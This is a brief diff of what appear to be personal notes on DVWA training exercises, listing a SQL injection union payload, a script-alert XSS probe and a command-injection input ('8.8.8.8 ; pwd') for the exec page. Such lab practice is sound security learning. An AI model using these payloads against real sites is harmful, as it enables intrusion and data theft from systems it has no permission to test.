@@ -40,3 +40,9 @@ in madium
 
 1' union select user, first_name from users#
 
+
+<script>alert("Ismael")</script>
+
+8.8.8.8 ; pwd
+
+owaspbwa/dvwa-git/vulnerabilities/exec
